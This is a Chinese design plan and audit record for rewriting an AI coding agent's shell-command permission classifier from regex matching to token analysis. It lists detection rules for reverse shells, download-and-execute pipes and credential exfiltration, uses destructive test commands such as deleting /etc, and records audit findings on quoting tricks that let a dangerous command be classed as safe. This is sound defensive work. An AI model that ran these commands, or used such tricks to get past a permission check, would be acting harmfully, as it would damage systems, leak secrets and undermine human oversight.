未知前缀合同：已确定为echo/printf输出或rg/grep模式的参数保持数据，`echo kill`的旧cautious断言改为general并记录为INV-02角色纠正。其余未知前缀的原一次剥头cautious规则继续保留，`rtk git add`仍为cautious；原raw已覆盖的可见真实wrapper载荷继续经明确载荷入口分类。新增命令族及把所有候选一律升级至Forbidden的变化保留在用户决定区。

### 10.9 参数解引用核心

```ts
// 将一个语法参数转成一个Word；保留起止区间，值只解除当前方言的引用外壳。
function readWord(node: Node, dialect: "bash" | "powershell" | "cmd"): Word {
  const parts = children(node).filter((child) => child.type !== "command_argument_sep")
  if (node.type === "redirected_file_name" && parts.length === 1) return readWord(parts[0], dialect)
  const raw = node.text
  const single = dialect !== "cmd" && raw.startsWith("'") && raw.endsWith("'")
  const double = raw.startsWith('"') && raw.endsWith('"')
  const body = single || double ? raw.slice(1, -1) : raw
  // 相邻引用片段属于一个argv，例如pre"fix"；子片段各自按引用方式解释。
  const value = node.type === "concatenation"
    ? parts.map((part) => readWord(part, dialect).value).join("")
    : single ? (dialect === "powershell" ? body.replaceAll("''", "'") : body)
    : dialect === "powershell" ? body.replace(/`(.)/gs, "$1")
    : dialect === "cmd" ? body.replace(/\\([\\'"$`#;^&|<> ()])/g, "$1")
    : double ? body.replace(/\\([\\$`"\n])/g, "$1") : body.replace(/\\(.)/gs, "$1")
  const expansion = ["expansion", "simple_expansion", "command_substitution", "sub_expression", "variable"]
  return {
    value, start: node.startIndex, end: node.endIndex,
    quoted: single || double,
    stripped: dialect === "bash" && !single && raw.includes("\\"),
    // 动态性仅维持原普通分类下限；变量取值与风险升级保持分离。
    dynamic: expansion.includes(node.type) || node.descendantsOfType(expansion).length > 0 ||
      (node.type === "word" && /[*?\[]/.test(raw)),
  }
}
```

cmd分支接收的是适配后的解析文本，因此解除的是适配层为Bash grammar加入的引用转义；实际执行继续使用原文。PowerShell的双引号内转义字符在正式实现中按grammar字符串片段保留换行、tab等字符语义，尤其核对路径中的字面反引号与escaped quote。

### 10.10 规则匹配与聚合顺序

每条命令先绑定参数角色，再执行原规则族。保护路径谓词只接收目标操作数，重定向谓词只接收输出目标，管道谓词只接收已确认连接的命令对。每次命中保留原level、reason和对应命令位置，普通节点不增加新的审查条件。

全条命令汇总取原`LEVELS`中的最高等级，并把该等级的reason按首次命中顺序去重连接。`raw`、canonical pattern与inline_scripts仍按原`maxRisk`规则取高风险，保留既有同级优先关系。已识别的最高等级不因后续解析问题降低；纯空白、解析不完整或原不透明输入继续沿原general合同。

包装器参数按照协议顺序消费，避免全argv中任意出现-c就当作入口：shell脚本文件、Python-m/脚本文件、Node脚本文件、PowerShell-File分别结束其入口参数区域。这里只纠正参数角色，脚本文件内容仍由原覆盖边界约束。SSH主机之前的已知取值选项先消费，之后载荷按原协议提取；WSL的发行版、用户及工作目录参数各自绑定。

### 10.11 分类验证矩阵

| 切片 | 误匹配修正对照 | 真实操作保护对照 | 验证seam |
| --- | --- | --- | --- |
| 重定向角色 | `rm -r ./out < /dev/null`为cautious | `rm -r /dev/null`保留Forbidden及原reason | evaluate |
| 原始远端事故 | 完整SSH守卫、nohup/setsid、日志重定向、后台连接符中的项目out删除为cautious | 同一实际删除目标换成保护根时为Forbidden | evaluate + ShellTool权限证据 |
| 选项值 | `find . -name '-delete' -print`沿用只读分类 | `find . -delete`为cautious | evaluate |
| 过滤值 | `Remove-Item ./out -Recurse -Exclude C:\Windows`按out分类 | `Remove-Item C:\Windows -Recurse`保留Forbidden | evaluate，PowerShell方言 |
| 搜索数据 | `rg '.env' src`是搜索模式 | `rg token .env`是敏感读取 | evaluate |
| HTTP参数 | `curl -H '--data=@.env' URL`为普通请求 | `curl --data @.env URL`保留dangerous | evaluate |
| 源码字符串 | `python -c 'print("os.remove(\"/\")")'`为数据 | 实际`os.remove("/")`保留原解释器规则 | evaluate + inline_scripts |
| 复合命令 | 前序普通读写保持各自等级 | 后续保护根删除的level与reason保留 | evaluate |
| 动态和空白 | `git status "$ARG"`及空白保持原general | 已确定的`git commit`风险仍为cautious | evaluate + auto |
| 政策守恒 | 普通HTTP、tee、chmod、解析错误维持原等级 | 原Git变更、进程终止、安装、账户、防火墙、计划任务、注册表、磁盘规则逐类保留 | 原120项测试及补充参数对照 |

每个新断言标注来自原合同或已确认误匹配，补充测试只调用分类函数。保留所有既有测试；因异步接口调整仅改await和测试声明。确实锁定旧误报的断言须在方案中逐项记录角色证据和新独立期望，随后进入全范围审计。

## 11. 路径清单

| 路径 | 处置 |
| --- | --- |
| 原 command 与 canonical patterns 双证据 | 保留原合同 |
| inline_scripts 附加证据 | 保留原合同并准确解释源码角色 |
| 已有 wrapper/远端载荷递归 | 保留已有入口集合 |
| malformed/动态 general 分类 | 保留原政策 |
| 失败后另用解析器重试 | 当前设计份额0 |

## 12. 替换清单调查

计划逐项核对所有 `RE_D_*`、`RE_C_*`、`RAW_*` 常量及调用方。每项记录旧命令集合、参数条件、路径条件、等级、reason、Token 等价谓词及回归用例。整体 raw 扫描完成迁移后由同一个 Token 主路径承载。

### 12.1 从 HEAD 重新取得的规则清单

以下是迁移对象的原政策合同，Token 实现只替换事实取得方式。局部路径、模式及参数值的正则继续用于原有值域；跨命令文本扫描改为角色明确的 Token 谓词。

| 原规则 | 等级与原 reason | Token 输入角色 |
| --- | --- | --- |
| rm 保护目录递归删除 | forbidden：`FORBIDDEN_ROOT_DELETE`；恰好系统二级 dangerous：`DANGEROUS_SUBTREE_DELETE` | rm 的递归选项及路径操作数，独立于输入/输出重定向 |
| Windows递归删除 | forbidden：`WIN_FORBIDDEN_DELETE`；dangerous：`DANGEROUS_SUBTREE_DELETE` | 原cmd/PowerShell命令集合的递归参数及目标 |
| Windows format | forbidden：`Windows drive format` | format 的盘符参数 |
| Python shutil.rmtree | forbidden：`recursive delete of filesystem root, home, or top-level system directory via Python — forbidden (cannot be authorized)` | 可见调用的字面路径，采用原解释器路径集合 |
| Python os.remove/unlink/rmdir | forbidden：`file removal targeting filesystem root, home, or top-level system directory via Python — forbidden (cannot be authorized)` | 原API集合及字面路径 |
| Node fs/require("fs") 删除 | forbidden：`file removal targeting filesystem root, home, or top-level system directory via Node.js — forbidden (cannot be authorized)` | 原rmSync/rmdirSync/unlinkSync调用及字面路径 |
| subprocess run/call/Popen rm | forbidden：`recursive delete of filesystem root, home, or top-level system directory through interpreter — forbidden (cannot be authorized)` | 原可见rm、原r/f参数条件和字面路径 |
| 解释器系统二级删除 | dangerous：`DANGEROUS_INTERPRETER_DELETE` | 原API的系统二级路径 |
| /dev/tcp、nc执行、socat EXEC、mkfifo组合、TCPClient | forbidden：`reverse shell pattern` | 重定向目标、执行选项、地址类型、原命令组合、构造类型，逐分支保留原集合 |
| 全进程终止 | forbidden：`mass process kill` | kill的信号与进程操作数及原killall5分支 |
| curl/wget到解释器 | dangerous：`remote download piped to interpreter; review the script locally before running safe commands` | 管道左命令与原右侧解释器集合 |
| PowerShell下载执行 | dangerous：`remote PowerShell download executed as code; review the script locally before running safe commands` | 原iwr/irm族与iex/Invoke-Expression管道 |
| 解码/解压到解释器 | dangerous：`decoded/decompressed payload piped to interpreter` | 原工具族及原消费者集合，原规则按工具族匹配 |
| 敏感读取到HTTP工具 | dangerous：`credential read piped to network transfer` | 原读取命令族的敏感路径与管道右侧HTTP工具 |
| 上传标志 | dangerous：`credential file sent with network transfer` | 原data/data-binary/data-raw/data-urlencode/d/form/F/upload-file/form-string/T集合；准确区分实际文件引用与普通数据 |
| scp/rsync/sftp出向凭据 | dangerous：`credential file sent with remote transfer` | 原首个远端参数之前的敏感本地源、原身份参数和.pub豁免 |
| sudoers写入 | dangerous：`sudoers modification grants privilege escalation` | 原重定向、tee、visudo、cp/mv/install目的位置 |
| chmod u+s/g+s | dangerous：`setuid/setgid bit creates privilege escalation surface` | 权限模式参数；文件名和其他命令的数据保持各自角色 |
| 普通文件删除 | cautious：`file deletion requires explicit approval` | 原删除命令族及原help/version边界 |
| 文件移动 | cautious：`file move or rename requires explicit approval` | 原移动命令族及路径参数 |
| shell RC写入 | cautious：`shell RC file modification enables persistent code execution` | 原RC路径集合的输出重定向目标 |
| Git hook写入 | cautious：`git hook modification runs code on git operations` | 原.git/hooks路径模式的输出目标 |
| cron写入 | cautious：`cron directory write enables persistent scheduled execution` | 原/etc/cron与/var/spool/cron输出目标 |
| systemd写入 | cautious：`systemd unit file write enables persistent service execution` | 原/etc/systemd与~/.config/systemd目标 |
| schtasks Create | cautious：`Windows scheduled task creation enables persistent execution` | 操作参数/Create，任务名/数据中的同词保持参数值 |
| Register-ScheduledTask | cautious：`PowerShell scheduled task registration enables persistent execution` | 原命令身份 |
| echo/printf到解释器 | cautious：`visible payload piped to interpreter requires review` | 真实管道与原解释器集合；可见真实高风险操作继续使用对应规则 |
| 敏感本地读取 | cautious：`sensitive file read requires explicit approval` | 原读取命令族的文件参数；搜索模式保持数据 |
| authorized_keys写入 | cautious：`SSH authorized_keys modification requires explicit approval` | 原家目录路径集合的输出目标 |
| 防火墙保护移除 | cautious：`firewall protection removal requires explicit approval` | 原iptables/ip6tables flush/delete-chain、ufw disable参数 |
| find删除 | cautious：`find file deletion requires explicit approval` | 原-delete或-exec/-execdir rm动作；取值选项里的同词保持数据 |
| Python普通删除 | cautious：`Python file deletion requires explicit approval` | 原可见Python API字面目标 |
| Node/subprocess普通删除 | cautious：`interpreter file deletion requires explicit approval` | 原API、rm参数条件与字面目标 |

### 12.2 已有 Token 规则的保持范围

`classifyTokens` 原有磁盘、shutdown、Git、patch、chmod/chown、账户、服务、监听、HTTP服务器、包安装/执行、远程传输及PowerShell文件写入规则逐项保留。参数绑定只用于区分操作参数与数据参数。新增wipefs offset升级、新模块/API、授权评分硬门槛和新增缓存策略的实施份额为0。

## 13. 正向映射

| 合同 | 生产路径 | 验证 |
| --- | --- | --- |
| INV-01 | Token 重定向角色 -> 删除路径绑定 | 同一 /dev/null 分别作为输入源和删除目标；原始SSH日志命令 |
| INV-02 | 引用/源码词法角色 -> 对应规则 | 搜索与输出字符串对照真实执行 |
| INV-03 | 原规则映射 -> level/reason | 全部旧规则回归，逐项解释有意纠正的误匹配 |
| INV-04 | 复合结构与已有 wrapper | 分隔符、远端载荷、参数取值 |
| INV-05 | 原level/reason接口，auto等待解析结果 | auto/reviewer/cache 既有测试 |
| INV-06 | 正式文件计划与 diff 计量 | 生产文件数与代码增删量 |
| INV-07 | 实施注释设计 | 函数职责、输入输出、关键分支审计 |
| INV-08 | sourceRisk现有调用事实与缺省cautious分支 | 两个用户样例；空字面量、其他API变量目标及字面保护路径对照 |

## 14. 反向映射

| 概念 | 合同 | 引入理由 |
| --- | --- | --- |
| 重定向与 argv 分离 | INV-01 | 原字符串扫描丢失参数角色 |
| 引用和源码 Token 边界 | INV-02 | 原全文匹配把数据当操作 |
| 保留等级与 reason 的规则映射 | INV-03 | 确保解析重写与政策变化分别管理 |
| 单一词法入口 | INV-04 | 共享ShellTool现有grammar，替换独立宽扫描 |
| 异步调用适配 | INV-01、INV-04 | 现有grammar以异步Promise装载；auto是唯一生产调用方，等待结果保持原分级路由 |
| 两个API的变量目标事实 | INV-08、用户P09授权 | 复用target可选的现有调用记录及普通删除reason；原字面筛选会丢掉这两个调用 |

## 15. 文件计划

| 文件 | 改动职责 | 代码增删预算目标 |
| --- | --- | --- |
| packages/opencode/src/shell/parse.ts | 新共享grammar owner；承接现有初始化、裸--归一化与Token角色提取 | 195 |
| packages/opencode/src/permission/precheck.ts | 原raw规则迁移；清除被替代的整句扫描；保留原规则集合和reason；复用Babel AST减少JS自定义词法 | 710 |
| packages/opencode/src/tool/shell.ts | 原parser/normalize移至共享owner，原执行与ask入口保持 | 75 |
| packages/opencode/src/permission/auto.ts | `evaluate`等待异步解析结果，原分支保持 | 4 |

合计估算984行生产代码增删，实施硬上限1000行；达到预算上限时先在相同路径内精简重复逻辑，完整行为仍为验收条件。新共享模块从HEAD已有parser职责重新编写，封存实现保持封存。`index.ts`、缓存、reviewer prompt、schema和配置保持HEAD。

删除清单按替代owner归并：整句RE_D/RE_C/RAW定位常量及forbiddenRaw/dangerousRaw/cautiousRaw由角色谓词替代；normalizeForRawScan、quoteOffsets、rawExecutableMatch/rawFindOrPythonTokens/rawExecutableSegmentEnd由AST边界替代；splitCommands/tokenizeRich/rawCommandSegments由共享grammar替代；windowsProtectedDeleteTier的整句扫描由同一参数记录替代。原protectedDeleteTier、Git分类、路径值模式、命令族常量、明确的编码载荷解码与原政策说明保留。注释随职责迁移，历史有实质约束的说明放到对应规则附近。

## 16. TDD 切片

公开 seam 为既有 `PermissionPrecheck.evaluate`。首切片为重定向与删除操作数隔离；随后依次验证引用数据、选项取值、复合与远端载荷、剩余原规则等价性。每一切片先运行红测，再实施获批逻辑，最后回归。方案阶段保留源码及测试现状。

## 17. 注释与可维护性

每个新增或实质修改的函数在入口说明其作用、输入及返回结果。复杂循环内就近说明引用状态、Token 边界、选项值消费、路径与重定向归属；数据复制说明复制对象及后续用途。文件头仅介绍模块职责和阅读顺序，历史解释移到对应实现附近。并列短参数表保持单行。

全局中文解释计量沿用 E/C：E排除import-only、格式、generated和纯移动，C为紧邻相关逻辑的有效中文解释；E>0时C至少ceil(E×0.15)。修改函数保持用户指定的8%下限，注释超过10行的函数保持低于40%。实际分配随完整代码设计计算。

本方案预计新增及实质修改有效代码E约650行（含测试），合格解释C至少110行，预计16.9%；最终以实际diff重新计算。说明分布于参数绑定、AST owner、语言引用、原规则范围、wrapper入口、Tree释放与测试对照；复杂函数入口分别写明输入输出，关键内部步骤写明原因。任何原注释信息损失由新owner处补齐。

## 18. 验证计划

| 命令 | 目录 | 作用 |
| --- | --- | --- |
| `bun test test/permission/precheck.test.ts` | packages/opencode | 原规则与误报回归 |
| `bun test test/permission/ --timeout 30000` | packages/opencode | 预检及授权路由兼容 |
| `bun test test/tool/shell.test.ts --timeout 30000` | packages/opencode | 工具侧原入口保持 |
| `bun typecheck` | packages/opencode | 异步解析接线与原Decision类型合同 |

完整 Session 测试的选择根据最终触及的调用链确定。原始症状单独验证，方案记录静态命令字符串，测试执行器只调用分类函数。

## 19. 预算

| 指标 | 硬上限及计量 |
| --- | --- |
| 生产文件 | 最多4个，包括新文件 |
| 生产代码行 | 新增与删除合计≤1000，import和类型计入；代码移动也计入 |
| 测试 | 与行为切片对应，保留旧断言的实际合同 |
| 配置、迁移、依赖 | 当前改动份额0 |

逐文件估算见第15节，注释与空行另列物理diff量。实施记录同时报告新增、删除和纯移动，使用HEAD作为基准，新增未跟踪文件一并计入；格式化与并列短列表保持用户指定风格。预算不足时修订同一设计，保留完整规则合同。

## 20. 风险与开放决定

当前明确风险为：数据与命令角色的纠正可能被混淆成政策扩缩。处理方式是先建立旧规则映射，再说明每个变化是角色修正还是额外政策选择。后者统一进入文末 A/R 清单。新命令、新API、动态变量求值和额外授权门槛的计划份额均为0。

性能验证分别测冷启动和热分类：grammar Promise复用，Tree按请求释放，整条命令只取得一次AST。选项绑定线性扫描argv；管道索引用Map避免每条边重新搜索命令数组。计划以当前500条数据库样本作回放窗口，再以仓库固化的事故与规则对照矩阵验证精度。输出仅包含聚合分类和时间，不输出用户命令或凭据。

## 21. 审计合同

流程为完整方案、独立方案审计、获批revision实施、独立实现审计。审计以用户当前范围为依据；对新增规则或政策调整要求逐项核对授权。主代理提供原始需求、方案路径、仓库根及Audit mode，审计员自行加载其材料。

## 22. 方案审计记录

第一轮审计：`ses_f56a8a397ffeMRWbEL4tZaTykx`，Audited revision：R1（重新开始），Full scope：yes。

原样记录 finding 标题与最终结论：

> B-01 源码分词将模板插值中的真实删除调用吞作字符串数据
>
> B-02 无命令名的有效重定向在 AST 提取中被直接丢弃
>
> B-03 here-doc 的源码被保存，但没有通往解释器规则的执行入口
>
> B-04 输出数据误判的既有分支与验收要求仍然冲突
>
> **BLOCK — `R1（重新开始）` 不予批准实施。**
>
> B-01 至 B-04 均需在 canonical plan 中修订，递增 revision、保持 `Approved revision: none` 和 `Implementation allowed: no`，然后重新进行全范围独立审计。本轮未修改任何文件。

R2处置：四项分别属于原执行区域、原重定向、原解释器输入及原输出参数的事实识别，均在Token修正范围内。源码词法器保留模板插值执行区；独立重定向以空argv事实进入原规则；字面stdin按现有解释器的输入协议进入同一源码匹配；输出数据与未知wrapper分别保留各自合同。对应验收增加上述成对输入，额外权限评分、缓存策略、API家族与变量求值保持原范围。

第二轮审计：同一调用`ses_f56a8a397ffeMRWbEL4tZaTykx`，Audited revision：R2，Full scope：yes。

> B-05 Python f-string 的执行区域仍被吞作普通字符串
>
> B-06 JavaScript 正则字面量中的数据仍会被误认为删除调用
>
> R1 的四项具体问题在 R2 中已有对应方案修正：JavaScript 模板插值、独立重定向、解释器字面 stdin、`echo kill` 数据角色。原 B-01 至 B-04 在**方案层面关闭**；B-05、B-06 是全范围复审发现的其他源码角色缺口。
>
> **BLOCK — R2 不予批准实施。**
>
> B-05、B-06 需在 canonical plan 中修订，递增 revision，保持 `Approved revision: none`、`Implementation allowed: no`，然后进行下一轮全范围独立审计。

R3处置：两项均是现有Python/Node源码的数据和执行区域识别，使用已有API和路径，归属本次Token迁移。增加f-string插值的同一词法边界，以及JavaScript正则字面量的数据Token。验证`python3`的here-doc中`f'{os.remove("/etc/passwd")}'`保留原Forbidden；`node -e 'console.log(/fs.rmSync("~")/)'`保持普通数据，实际同名调用仍按原等级。新增模块、API、变量求值和调用图的份额保持0。

第三轮审计：`ses_f56a8a397ffeMRWbEL4tZaTykx`，Audited revision：R3，Full scope：yes。

> B-05 Python 插值边界仍被通用反斜杠跳过规则破坏
>
> B-06 正则字面量识别仍依赖不完整的前置 Token 列表
>
> **BLOCK — R3 不予批准实施。**
>
> B-05、B-06 保持阻断。修订 canonical plan、递增 revision 后进行下一轮全范围审计；继续保持 `Approved revision: none`、`Implementation allowed: no`。

R4处置：Python插值花括号按语言语义保留，反斜杠处理与JavaScript模板分别定义。JavaScript运算符使用最长匹配，正则起始状态由值/运算符类别及控制条件括号计算，覆盖`&&`、`||`、箭头函数与控制语句后的位置。增加raw f-string和逻辑表达式正则的成对验收，范围仍是原源码Token角色。

第四轮审计：`ses_f56a8a397ffeMRWbEL4tZaTykx`，Audited revision：R4，Full scope：yes。

> B-06 JavaScript 表达式与语句边界仍会混淆正则数据和实际调用
>
> B-05 在方案层面关闭：R4 将 Python 花括号处理与 JavaScript 模板转义分开，上一轮 raw f-string 示例不再被反斜杠跳过规则吞掉。
>
> **BLOCK — R4 不予批准实施。**
>
> B-06 保持阻断；B-05 在方案层面关闭。修订 canonical plan 并递增 revision 后，继续全范围独立审计。当前保持：
>
> - `Approved revision: none`
> - `Implementation allowed: no`

R5处置：该问题归属已有JavaScript数据与执行的语法解释。使用仓库既有Babel parser替代整套手写JS上下文启发式，移除expressionStart、括号/语句推断与JS模板状态。纯AST实测三个样例：函数表达式后除法中的删除调用为calls=1/regex=0；else后正则为calls=0/regex=1；逻辑运算后正则为calls=0/regex=1。均只解析示例字符串，路径使用sample，整个测试未执行源码。Python的已关闭问题保持同一有限词法路径。预算重新分配为195+710+75+4=984，硬上限维持1000。

## 23. 实施证据

第五轮方案审计：`ses_f56a8a397ffeMRWbEL4tZaTykx`，Audited revision：R5，Full scope：yes。原样记录本轮结论：

> ## Blocking findings
>
> No blocking findings.
>
> 本结论适用于完整读取并复审的 **R5**，包括本轮新增的 Babel AST 路径及此前所有计划修改区域。
>
> ## Non-blocking findings
>
> - **B-06 在方案层面关闭。** JavaScript 改为由 Babel grammar 区分正则、模板与除法，删除了反复产生歧义的手写上下文启发式。调用提取只消费实际 `CallExpression`，此前的正则误报和除法操作数漏检已有对应路径。
> - B-01 至 B-05 的关闭状态保持；独立重定向、解释器 stdin、输出参数及 Python 插值的修正合同未被撤回。
> - Babel 的打包入口可用性与冷启动开销仍需在实施时验证。依赖存在及构建配置支持打包，不能代替编译产物的实际验证。
> - 984 行预算留有余量较少，实施必须按实际新增、删除和移动代码计量；不能以预算为由省略规则或测试。
> - 历史审计记录仍为摘录。完整保存发现及非阻断分类有利于实现审计追溯，此记录问题不阻断 R5。
>
> ## Rejected speculation
>
> - 不因 `@babel/core` 位于 devDependencies 就推定发布失败：`packages/opencode/package.json:38` 已声明依赖，`packages/opencode/script/build.ts:483` 的 Bun 构建会打包入口依赖，当前 external 仅为 `node-gyp`。最终可用性留待实施验证。
> - 不要求新增 API、变量求值、导入别名追踪或动态调用图。
> - 不要求调整权限等级、保护目录、缓存、strict 或 reviewer 授权政策。
> - 不要求保留 raw 全文扫描作为解析失败后的备用路径。
>
> ## Primary-path and fallback verdict
>
> **通过方案阶段审查。**
>
> 每项职责具有明确主路径：
>
> - Shell 文本由共享 grammar 提取命令、参数、重定向和载荷事实。
> - Python 源码进入其有限词法路径。
> - JavaScript 源码进入 Babel AST 路径。
> - 原规则统一消费事实，输出原 level/reason，由既有审批路由处理。
>
> 语言分支由输入协议决定，不在一个解析器失败后尝试另一个。JavaScript 的语法错误沿明确的 general 合同处理，加载或内部异常继续抛出；没有新增备用成功路径。
>
> 代码质量与中文注释的计划承诺满足要求：函数入口说明、复杂逻辑就近解释，以及 `C ≥ ceil(E×15%)`。计划估算 `E≈650、C≥110`；实际 E/C、类型、风格、行数和测试结果须在实现审计重新核算。
>
> ## Release verdict
>
> **APPROVE — 仅批准 R5 进入实施阶段。**
>
> 可将本次完整独立审计结论记录后，进行以下行政状态更新：
>
> - `Status: approved`
> - `Revision: R5`
> - `Approved revision: R5`
> - `Implementation allowed: yes`
>
> 任何实质设计变化仍须递增 revision 并重新审计。实现完成后必须通过完整验证及独立实现审计，才能声明完成。
>
> 本轮为第 5 轮方案审计，未修改任何文件。

### 23.1 R5实施与R6用户授权变更

实际生产文件为`src/permission/precheck.ts`、`src/permission/auto.ts`、`src/tool/shell.ts`及新增`src/shell/parse.ts`；路径均相对于`packages/opencode`。测试改动为`test/permission/precheck.test.ts`与`test/permission/auto.test.ts`。R6只增加P09中的两个变量目标cautious用例；其余政策采用原范围。用户最新要求为“其他的 precheck 的相关的其他内容都不要再进行修改了……你要做的唯一的内容就是说把他们的正则匹配的形式去改成 token 化的形式，保持精确性即可。”后续工作集中于已实现迁移的验收、实现审计与提交。

语法事实由共享grammar取得，原全文扫描、独立split/tokenize及raw包装器扫描退出生产路径。JavaScript调用由Babel AST识别，Python沿用本方案有限词法入口。原路径值域、等级、reason、Git分类、auto路由及会话缓存保持各自owner。FIFO组合使用grammar中的分号/管道节点分组；分组游标随源码顺序前进，原组合范围中的执行名与参数文字分别处理。内部命令序号在入表时确定，管道直接引用该序号。

| Red → Green切片 | 实际观察与验收 |
| --- | --- |
| 原始重定向事故 | HEAD把`rm -r ./output < /dev/null`判为forbidden；迁移后为cautious，真正删除`/dev/null`仍为forbidden |
| 选项与搜索数据 | `find -name '-delete'`、`rg '.env' src`红测后通过，真实删除及敏感路径读取保持原等级 |
| 脚本入口边界 | `bash script.sh -c 'rm -rf /'`及PowerShell-File后-Command曾误判forbidden；按入口元数绑定后general，真实-c/-Command仍保持风险 |
| 原FIFO组合 | `mkfifo fifo && bash`初次迁移返回general，恢复原组合规则后forbidden；分号边界和输出数据对照保持general |
| 远传参数元数 | `rsync -P .env host:/backup`曾因-P吃掉路径而降为cautious；区分rsync与scp取值协议后dangerous |
| 原非空字面边界 | 空字符串删除目标曾升为cautious；恢复原非空字面约束后general |
| P09用户例外 | 两个变量目标用例先观察到general，再按用户授权改为cautious；os.unlink/fs.rmSync变量目标及空字符串仍为general |
| auto事件关联 | grammar异步装载后，先等待evaluate结果，再验证返回reviewID与启动事件相同；保持原关联断言 |

原始完整SSH命令已直接纳入`separates redirected input from recursive deletion targets`测试，保留用户提供的主机、两个test守卫、nohup/setsid、完整路径、两个rm长选项、日志重定向、fd合并、stdin和后台PID输出。测试仅把该文本提交分类器，结果为cautious。

旧断言的角色修正记录：echo的kill参数改为输出数据general；换行后的`-1`、`u+s`、`.env`与`-F`分别属于后续命令；Bash换行后前置`|`经`bash -n`确认属于语法错误，保留已识别命令等级；真正的管道后换行继续保留原下载/外传风险；stderr文件重定向保留原scp审查；Windows路径样本显式携带cmd/pwsh方言。其他既有断言的改动为异步接口适配。

### 23.2 验证结果

下列Bun测试及类型检查均在`packages/opencode`运行：

| 命令 | 结果 |
| --- | --- |
| `bun test test/permission/precheck.test.ts test/permission/auto.test.ts --timeout 30000` | 153 pass，0 fail，720 assertions |
| `bun test test/permission/ --timeout 30000` | 305 pass，0 fail，1096 assertions，132.24s |
| `bun test test/tool/shell.test.ts --timeout 30000` | 204 pass，0 fail，742 assertions，96.56s |
| `bun test test/session/prompt.test.ts --timeout 30000` | 104 pass，14 skip，0 fail，461 assertions，500.17s；该测试文件保持HEAD |
| `bun test test/permission/precheck.test.ts -t "separates redirected input"` | 原始完整SSH文本替换缩略样本后，1 pass，0 fail，3 assertions |
| `bun typecheck` | exit 0 |
| `git diff --check`，仓库根目录 | exit 0 |

reviewer套件中的400及Session套件中的503输出来自既有错误响应测试；套件最终均为0 fail。完整CLI发布构建保持原状，编译验证限定于变更的预检入口及其grammar/Babel依赖。

编译smoke的自包含入口如下；构建使用包内tsconfig、Bun compile与`.wasm:file` loader，运行目录独立于仓库。六个断言均通过：grammar首次约73ms，PowerShell与cmd约3.3/1.2ms，Babel首次约107ms，两个变量目标约1.5/1.9ms。这是单次冷/热装载观察。

```ts
import { PermissionPrecheck } from "../../src/permission/precheck"
const cases = [
  ["git status", "bash", "safe"], ["git status", "pwsh", "safe"], ["git status", "cmd", "safe"],
  ["node -e 'fs.unlinkSync(\"stale.tmp\")'", "bash", "cautious"],
  ["python -c 'os.remove(path)'", "bash", "cautious"],
  ["node -e 'fs.unlinkSync(path)'", "bash", "cautious"],
]
for (const [command, shell, expected] of cases) {
  const result = await PermissionPrecheck.evaluate({ permission: "bash", patterns: [command], metadata: { command, shell } })
  if (result.level !== expected) throw new Error(JSON.stringify({ command, result }))
}
```

Bun构建输出包含tsconfig目录句柄的`directory mismatch`诊断，构建exit 0，305个模块成功打包，编译产物实际执行exit 0。此诊断保留为工具链观察项。

### 23.3 实际预算与注释

第二轮返工后生产代码新增与删除合计1000行：precheck 777、auto 2、shell工具76、新parse模块145，合计4个生产文件。计量包含import、类型与移动代码，排除空行和纯注释行。

第二轮独立审计纠正计量口径：C只计算本次新增或实质修改的中文解释。返工后新增非空非import代码上界为1318行，中文注释候选212行；剔除前轮识别的8行标题/概述后候选为204行，上界所需为198行。最终实际E/C由实现审计重新核算，既有未改注释从计量中排除。

解释补充集中于真实迁移边界：相邻Python字面量、printf格式与输入参数、env唯一Token入口、重定向owner及旧raw测试说明。注释按函数非空行分布，保留原复杂行为约束，迁移说明与具体分支相邻。

新增注释代表：find/CURL取值表解释参数元数与风险条件的区别；directStart说明返回的切片索引及包装器参数归属；parse.analyze解释重定向owner、管道序号和Tree释放；P09说明仅记录变量目标调用并复用普通删除reason。

HEAD既有预检套件基线：`bun test test/permission/precheck.test.ts`，120 pass、0 fail、612 assertions，2.75s。该结果用于后续区分原规则兼容与定向误报修复，描述的是当前原实现。

只读生产语料调查：用户指定数据库`C:\Users\Lenovo\.local\share\opencode\opencode.db`以`bun:sqlite`的readonly模式打开，查询part的tool及`state.input.command`字段，仅输出统计。当前bash/shell记录146385条，其中hot54273条、command字符串可用54237条。对最近500条可用命令调用HEAD分类函数，safe54、general428、cautious15、dangerous3、forbidden0、异常0，耗时171ms。命令仅作为分类器字符串输入，记录正文与凭据内容均未输出。该统计描述抽样可执行性与原实现分布，准确率由有独立预期的行为用例验证；冷存储语料的完整回放在后续验证设计中按实际存储owner调查。

## 24. 实现审计记录

### 第一轮：R6

Invocation：`ses_f562b90c1ffeDDrga6vQd2tuVP`。审计员对照HEAD `3f0981d2c32f6e3439182bf348b47e04834ae8fd`；该HEAD与原基线在本任务五个既有代码/测试文件上的diff为空。以下原样记录审计结论及分类：

> ## Blocking findings
>
> ### B-01 命令名中的相邻引用片段未解码，已有删除分类可降为 general
>
> - Violated invariant: INV-02、INV-03；Token 迁移必须保留真实执行名及原权限等级。
> - Evidence class: reachable。
> - Producer and execution path: ShellTool 接受任意命令字符串 → `PermissionPrecheck.evaluate` → `ShellParse.analyze` → `word(command_name)` → `evaluateCommand`。
> - Source evidence: `packages/opencode/src/shell/parse.ts:92` 只展开 `redirected_file_name` 外壳；`packages/opencode/src/shell/parse.ts:98` 仅在当前节点就是 `concatenation` 时拼接片段。实际 Bash grammar 的 `command_name` 包含一个 literal 子节点，见 `node_modules/tree-sitter-bash/grammar.js:487`、`node_modules/tree-sitter-bash/src/node-types.json:868`。
> - Canonical-plan evidence: §10.9 明确要求相邻引用片段组成同一 argv；§12 要求保留原命令族。
> - Responsibility owner: `ShellParse.word`。
> - Concrete consequence: `r"m" -rf ./build` 实际执行 `rm`，提取结果却保留 `r"m"`，无法命中删除规则，最终进入 general；`r"m" -rf /etc` 同样丢失原 forbidden。`packages/opencode/src/permission/auto.ts:74` 将非 strict 的 general 直接允许。旧 tokenizer 会去掉片段引号并识别 `rm`。
> - Why this is not speculative: 当前 grammar、节点提取代码和分类分支共同证明该路径；入口没有禁止相邻引用语法。
> - Minimal correction direction: 在现有单词解释 owner 中正确处理命令名的 literal 外壳，复用同一片段解码路径；补充执行名引用对照测试，不增加备用解析器。
>
> ### B-02 Shell 的直接 here-doc／here-string 源码未进入分类路径
>
> - Violated invariant: INV-03、INV-04；已有解释器实际消费的可见 stdin 必须保留其风险。
> - Evidence class: reachable。
> - Producer and execution path: 例如以下文本进入 ShellTool 的 Bash 请求：
>   ```bash
>   bash <<'SH'
>   rm -rf /etc
>   SH
>   ```
